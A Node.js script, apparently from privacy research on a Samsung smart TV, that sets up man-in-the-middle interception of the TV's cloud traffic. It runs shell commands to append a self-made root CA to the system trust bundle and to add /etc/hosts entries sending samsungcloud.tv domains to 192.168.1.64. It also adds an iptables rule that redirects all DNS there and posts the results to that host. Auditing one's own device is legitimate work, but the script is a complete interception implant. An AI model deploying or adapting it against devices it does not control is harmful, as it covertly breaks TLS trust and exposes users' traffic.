"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

var HOST = "192.168.1.64";
var PORT = 9999;
var CA_PEM = "-----BEGIN CERTIFICATE-----\nMIIDZjCCAk6gAwIBAgIUHFc65ZoZHPV1EGpPJ3P97bUOqPgwDQYJKoZIhvcNAQEL\nBQAwSzELMAkGA1UEBhMCTloxGTAXBgNVBAoMEFRWIFByaXZhY3kgQXVkaXQxITAf\nBgNVBAMMGFRWIFByaXZhY3kgQXVkaXQgUm9vdCBDQTAeFw0yNjEwMDkyMTE1NDFa\nFw0zNjEwMDcyMTE1NDFaMEsxCzAJBgNVBAYTAk5aMRkwFwYDVQQKDBBUViBQcml2\nYWN5IEF1ZGl0MSEwHwYDVQQDDBhUViBQcml2YWN5IEF1ZGl0IFJvb3QgQ0EwggEi\nMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDO+q8IaUgphgotoVz1c5kkkslJ\nRugGcL0vmIbmd6ET1sy60aOMT8AOAwf2+m5wZn7JGwT0DLbZsw+EVD0v0jXZckFq\nPFCLuvdWNHmthy71cZOfoelPpUalmL5+7XOmYTDVDFueWS/GaFa4I04+Le0bH/dV\nFmOLn5BoQOYqaiHdi2onPicwpK3QalgjkbOq5/HbxLz9CxyDA75mKu9ledXcyLwz\n4jIeXS4bFhQpafCNO5+t4OUx6P/K18ifdFA9ExVzQDZ0uXn8Kc1AH5hp1IXsqHWG\nisw5+DAbasN5Zlt8B8ZoEI5KWOGpBZwSUwwH4LDfX0Wg1v34Z16NOIEFq/23AgMB\nAAGjQjBAMA8GA1UdEwEB/wQFMAMBAf8wDgYDVR0PAQH/BAQDAgGGMB0GA1UdDgQW\nBBQH3eYU1I/cHjrtbhpBB+dNEQYbaTANBgkqhkiG9w0BAQsFAAOCAQEAfz8CTH7b\nthFKxQ1ol5e6Cp0MpuMqqTKMlw3V3g1gkOZ4DPUFTlaLvqlRcqY/ZU94uSLbciP0\nj1URGOskQeFrJwVmU1pXtuvJlBjwa/xIzgDdICcI3OJwZ3w31+YcyBP+N56x7nO7\nmJDPKQOo3oclMijAFiHhQ2zQZholrwy0kEX0pZncdvCEXdCF5nnNoHSEcKEZoamo\nJQMLdPUSmddaW9xiPW2V+MekzZ26hRg8AaJUQl+SKopXfK0F/DPS7zsaSh7sCldN\nQL+uINxIYEBiTE6wI89JF0eMbLWpWh1i8AoKEMgNJ8J/jvpGm6oJjdTYp6S2FoZB\nIRq5KwSOEknIzQ==\n-----END CERTIFICATE-----";
var CA_HASH = "9893a9bf";

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 3000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();

var BUNDLE = "/opt/var/lib/ca-certificates/ca-bundle.pem";
var already = sh("grep -c 'TV Privacy Audit Root CA' " + BUNDLE);
out.bundle_before = sh("wc -c " + BUNDLE);

if (already.trim() === "0") {
    sh("cp " + BUNDLE + " " + BUNDLE + ".bak");
    var tmp = "/tmp/tv-audit-ca.pem";
    fs.writeFileSync(tmp, CA_PEM.replace(/\\n/g, "\n") + "\n");
    out.append = sh("cat " + tmp + " >> " + BUNDLE + " && echo APPENDED");
    fs.writeFileSync("/tmp/tv-audit-ca.0", CA_PEM.replace(/\\n/g, "\n") + "\n");
    out.certdir = sh("cp /tmp/tv-audit-ca.0 /usr/share/ca-certificates/certs/" + CA_HASH + ".0 && ln -sf /usr/share/ca-certificates/certs/" + CA_HASH + ".0 /opt/etc/ssl/certs/" + CA_HASH + ".0 && echo CERTDIR_OK");
} else {
    out.append = "already present";
}
out.bundle_after = sh("wc -c " + BUNDLE + "; grep -c 'TV Privacy Audit Root CA' " + BUNDLE);

var hosts = "/etc/hosts";
var hchk = sh("grep -c 'TV-AUDIT-MITM' " + hosts);
if (hchk.trim() === "0") {
    var lines = [
        "192.168.1.64 ocfconnect-shard-ap03-apnortheast2.samsungiotcloud.com",
        "192.168.1.64 tvpnlinupepgpus.samsungcloud.tv",
        "192.168.1.64 config.samsungcloud.tv",
        "192.168.1.64 log.samsungcloud.tv",
        "192.168.1.64 ncp.samsungcloud.tv"
    ];
    fs.appendFileSync(hosts, "\n# TV-AUDIT-MITM\n" + lines.join("\n") + "\n");
}
out.hosts = sh("tail -8 " + hosts);

out.ipt = sh("iptables -t nat -C OUTPUT -p udp --dport 53 -j DNAT --to-destination 192.168.1.64:5353 2>/dev/null || iptables -t nat -A OUTPUT -p udp --dport 53 -j DNAT --to-destination 192.168.1.64:5353; iptables -t nat -L OUTPUT -n | head -5");

post("/mitm_inject", out);

var test = {};
test.fetch = sh('node -e "require(\'https\').get(\'https://tvpnlinupepgpus.samsungcloud.tv/\',function(r){console.log(\'STATUS \'+r.statusCode);r.on(\'data\',function(){});r.on(\'end\',function(){process.exit(0)})}).on(\'error\',function(e){console.log(\'ERR \'+e.message);process.exit(0)});setTimeout(function(){console.log(\'TIMEOUT\');process.exit(0)},8000);"', 2000);
post("/mitm_testfetch", test);
